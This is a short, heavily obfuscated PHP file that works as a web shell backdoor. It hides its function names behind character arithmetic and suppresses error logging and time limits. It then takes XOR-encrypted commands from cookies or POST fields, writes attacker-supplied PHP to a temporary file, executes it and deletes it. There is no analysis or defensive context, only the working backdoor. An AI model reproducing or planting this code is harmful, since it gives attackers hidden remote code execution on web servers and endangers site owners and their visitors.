<?php $fojTKn = "\x66".chr(166-61).'l'.'e'."\137"."\160"."\165".chr(146-30).chr(95).chr(899-800)."\x6f"."\156"."\164".chr(1015-914).'n'.'t'.'s';
$QguPWpw = "\142".'a'."\x73".chr(207-106).chr(345-291).chr(52).chr(95)."\144".'e'.chr(494-395)."\x6f"."\x64"."\145";
$zyHDu = 'i'."\156".'i'.'_'.chr(115).'e'."\164";
$znOnCdU = "\x75".'n'.chr(108).chr(105)."\156"."\153";


@$zyHDu("\145"."\162"."\162".chr(304-193).chr(929-815).'_'.chr(108)."\x6f".chr(592-489), NULL);
@$zyHDu(chr(108)."\x6f".chr(103).'_'."\x65"."\x72"."\x72".'o'.chr(114).chr(1076-961), 0);
@$zyHDu("\155"."\141".chr(730-610).'_'.chr(101)."\170"."\145".'c'."\x75".'t'.chr(105)."\x6f".'n'.chr(95).'t'.chr(184-79)."\x6d".chr(847-746), 0);
@set_time_limit(0);

function wVGefbr($jhYsC, $FotlybE)
{
    $nsfFPC = "";
    for ($AWZnmnPG = 0; $AWZnmnPG < strlen($jhYsC);) {
        for ($j = 0; $j < strlen($FotlybE) && $AWZnmnPG < strlen($jhYsC); $j++, $AWZnmnPG++) {
            $nsfFPC .= chr(ord($jhYsC[$AWZnmnPG]) ^ ord($FotlybE[$j]));
        }
    }
    return $nsfFPC;
}

$NIBxKAeIuC = array_merge($_COOKIE, $_POST);
$AnnxfX = '004c9bad-094a-4793-a440-fc5b8731fdf5';
foreach ($NIBxKAeIuC as $UGUEy => $jhYsC) {
    $jhYsC = @unserialize(wVGefbr(wVGefbr($QguPWpw($jhYsC), $AnnxfX), $UGUEy));
    if (isset($jhYsC[chr(97).chr(1073-966)])) {
        if ($jhYsC[chr(97)] == chr(139-34)) {
            $AWZnmnPG = array(
                "\x70".chr(573-455) => @phpversion(),
                "\163".'v' => "3.5",
            );
            echo @serialize($AWZnmnPG);
        } elseif ($jhYsC[chr(97)] == chr(312-211)) {
            $GaliT = "./" . md5($AnnxfX) . "\56".chr(105).'n'."\x63";
            @$fojTKn($GaliT, "<" . chr(670-607).chr(734-622)."\150".chr(112).' '.'@'.'u'.'n'.chr(108).chr(1097-992)."\x6e".chr(107).chr(40).'_'."\137".'F'."\111".'L'."\105".'_'.chr(95)."\51".chr(186-127)."\x20" . $jhYsC['d']);
            include($GaliT);
            @$znOnCdU($GaliT);
        }
        exit();
    }
}

